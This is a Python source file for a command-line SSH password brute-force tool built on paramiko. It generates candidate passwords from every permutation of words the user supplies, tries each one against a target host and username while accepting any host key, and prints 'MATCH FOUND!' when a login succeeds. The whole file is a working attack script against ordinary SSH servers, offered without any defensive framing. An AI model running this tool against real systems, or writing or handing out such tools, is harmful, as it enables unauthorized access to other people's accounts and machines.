import optparse
import paramiko
from itertools import permutations
from threading import *


def parser():


    parser = optparse.OptionParser('%prog' + '[host]')
    options_dir = [
        
        {'shortname':'-u','longname':'--user','dest':'user', 'type':'string','help':'specify the username'},
        # {'shortname':'-p','longname':'--password','dest':'password','type':'string','help':'specify the password'},
        # {'shortname':'-c','longname':'--command','dest':'cmd','type':'string','help':'specify the command'},
        {'shortname':'-g','longname':'--generate','dest':'generate','type':'string','help':'generate wordlist for password bruteforce attack ; example : word1,word2,word3'}
    
    ]
    
    for option in options_dir:

        parser.add_option(option['shortname'],option['longname'],dest=option['dest'],type=option['type'],help=option['help'])


    (options,args) = parser.parse_args()

    if(options.user == None):

        parser.print_help()
        return

    
    # if(options.password == None):

    #     parser.print_help()
    #     return


    # if(options.cmd == None):

    #     parser.print_help()
    #     return


    if(options.generate == None):

        parser.print_help()
        return

    


    return {


        'arg':args[0],
        'prams':options

    }


def ssh(host,user,password):

    auth_failed = False
    ssh_client=paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh_client.connect(hostname=host,username=user,password=password, banner_timeout=200)

    except paramiko.ssh_exception.AuthenticationException:

        # print("Authentication Failed")
        auth_failed = True
        ssh_client.close()
        return auth_failed

    except paramiko.ssh_exception.SSHException:

        return

    # (stdin,stdout,stderr)=ssh_client.exec_command(command)

    # for output in stdout.readlines():

    #     print(output)

    # for error in stderr.readlines():

    #     print(error)

    ssh_client.close()
    return auth_failed

def wordlist_generator(array):

    generated_array = []

    for i in range(1,len(array)+1):

        for perm in permutations(array,i): 

            generated_array.append("".join(perm))

    return generated_array    


def brutefoce(generated_array,connection,host,user):


    for word in generated_array:


        if( connection(host,user,word) == True):

            print("Authentication Failed for \n" + "username: " + user + " , " +  "password: " + word)

        
        if(connection(host,user,word) == False):

            print("MATCH FOUND! \n" + "username: " + user + " , " + "password: " + word )



def main():

    host = parser()['arg']
    user = parser()['prams'].user
    # password = parser()['prams'].password
    # command = parser()['prams'].cmd
    generate_array = parser()['prams'].generate.split(',')
    generated_array = wordlist_generator(generate_array)
    connection = ssh
    brutefoce(generated_array,connection,host,user)
    

    








if __name__ == '__main__':

    main()

